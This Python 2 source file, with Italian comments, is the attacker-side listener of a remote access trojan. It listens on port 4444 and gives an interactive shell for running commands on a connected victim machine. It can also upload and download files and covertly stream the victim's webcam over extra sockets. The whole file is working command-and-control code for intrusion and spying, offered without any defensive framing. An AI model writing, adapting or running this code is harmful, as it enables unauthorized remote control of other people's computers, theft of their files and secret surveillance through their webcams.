#! /usr/bin/env python
# -*- coding: iso-8859-15 -*-

import socket
import json
import base64
import sys
import subprocess
import cv2
import struct
import pickle


class Listener:
    def __init__(self, ip, port):
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        listener.bind((ip, port))
        print("[+] Waiting for incoming connections..")
        listener.listen(0)
        self.connection, address = listener.accept()
        print("[+] Got a connection: " + str(address))

    def reliable_send(self, data):
        json_data = json.dumps(data, encoding="iso8859_15")
        self.connection.send(json_data)
        # self.connection.send(json_data.encode()) # Per python3

    def reliable_receive(self):
        json_data = ""
        # json_data = b"" # Per python3. La stringa deve essere convertita in bytes
        while True:
            try:
                json_data = json_data + self.connection.recv(1024)
                return json.loads(json_data)
            except ValueError:
                continue

    def execute_remotely(self, command):
        if command[0] == "exit":
            self.connection.close()
            exit()
        self.reliable_send(command)
        return self.reliable_receive()

    def write_file(self, path, content):
        with open(path, "wb") as file:
            file.write(base64.b64decode(content))
            return "[+] Download successful."

    def read_file(self, path):
        with open(path, "rb") as file:
            return base64.b64encode(file.read())

    def webcam_stream(self):
        invio_flag = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        invio_flag.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        invio_flag.bind(("192.168.0.113", 11211))
        invio_flag.listen(0)
        socket_flag, addr = invio_flag.accept()

        video_stream = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        video_stream.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        video_stream.bind(("192.168.0.113", 11311))
        video_stream.listen(0)
        socket_video, addr = video_stream.accept()

        print "[+] Webcam active..."
        data = b""
        payload_size = struct.calcsize("Q")
        while True:
            socket_flag.send("1")
            while len(data) < payload_size:
                packet = socket_video.recv(1024)
                if not packet:
                    break
                data += packet
            packed_msg_size = data[:payload_size]
            data = data[payload_size:]
            msg_size = struct.unpack("Q", packed_msg_size)[0]

            while len(data) < msg_size:
                data += socket_video.recv(1024)
            frame_data = data[:msg_size]
            data = data[msg_size:]
            frame = pickle.loads(frame_data)
            cv2.imshow("Webcam", frame)
            key = cv2.waitKey(1) & 0xFF
            if key == ord('q'):
                socket_flag.send("0")
                cv2.destroyAllWindows()
                socket_flag.close()
                socket_video.close()
                break
        print "[-] Webcam close..."

    def run(self):
        while True:
            command = raw_input(">> ")
            print(command)
            command = command.split(" ")
            print(command)

            try:
                if command[0]=="webcam":
                    json_data = json.dumps(command, encoding="iso8859_15")
                    self.connection.send(json_data)
                    self.webcam_stream()

                if command[0] == "upload":
                    file_content = self.read_file(command[1])
                    command.append(file_content)

                result = self.execute_remotely(command)

                if command[0] == "download" and "[-] Error " not in result:
                    self.write_file(command[1], result)

            except Exception:
                result = "[-] Error during comand exection."

            print(result)





ip = subprocess.check_output(["hostname", "-I"]).strip()
try:
    my_listener = Listener(ip, 4444)
    my_listener.run()
except Exception:
    sys.exit()